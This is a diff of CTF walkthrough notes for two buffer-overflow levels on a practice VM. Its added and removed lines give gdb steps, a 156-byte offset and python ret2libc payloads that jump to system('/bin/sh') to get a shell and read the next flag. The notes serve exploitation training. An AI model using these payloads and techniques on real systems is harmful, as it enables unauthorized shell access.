@@ -1,33 +1,23 @@
-start ssh connection with ssh -p 4242 level01@127.0.0.1
+start ssh connection with ssh -p 4242 level04@127.0.0.1 use flag from level03
 
-use flag from level00
+this level is quite similar to level01 except the fact that we work with child process here
 
-start the level01 file wtth gdb
+start with gdb (see source), we can overflow at gets run in a child process at main+150
 
-disas main
+parent is watching his child not to run execve function and will stop us from running this type of shell code but we can make a return to libc just as we did at level02
 
-disas verify_user_name
+to follow the child proccess we should make set follow-fork-mode child command at gdb
 
-focus attention on cmp function where the user_name is checked - it is dat_wil, we have it
-
-disas verify_user_pass
-
-we can see that no matter what is the outcome we end with falure but fgets is able to input 100 symbols while buffer has only 16 - we can overflow it
-
-https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ for finding an offset with breakpoints before and after the second fgets
-
-with 100 letters entered we get a segFault at 80s offset
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ for finding an offset - it is 156
 
 we need to: set a system function pointer at return pointer of the stack, enter anything at the frame pointer, set the first local variable of the callee to /bin/sh
 
-info proc map -> find 0xf7e2c000, 0xf7fd0000, "bin/sh" (libc functions) to find "bin/sh string address
+info proc map -> find 0xf7e2c000,0xf7fd0000,"/bin/sh" (libc functions) to find "bin/sh string address 0xf7f897ec - actually as far as we don't have rpath it is static
 
-info function system to find system function address
+info function system to find system function address 0xf7e6aed0 - static to, we could look up it in level01
 
-found out that we have a space available for file saving at /tmp/ and python 2.7.3 installed
+python -c 'print "U"*156+"\xd0\xae\xe6\xf7"+"4242"+"\xec\x97\xf8\xf7"' > /tmp/tmp to cunstruct a payload - little endian for addresses - same as level01 but 156 Us
 
-python -c 'print "dat_wil\n"+"U"*80+"\xd0\xae\xe6\xf7"+"4242"+"\xec\x97\xf8\xf7"' > /tmp/tmp to cunstruct a payload - little endian for addresses
+cat /tmp/tmp /dev/stdin | ./level04 to input a payload, we add stdin to be able to continue work
 
-cat /tmp/tmp /dev/stdin | ./level01 to input a payload, we add stdin to be able to continue work
-
-go to the level02 folder and check flag in .pass
+go to the level05 folder and check flag in .pass!
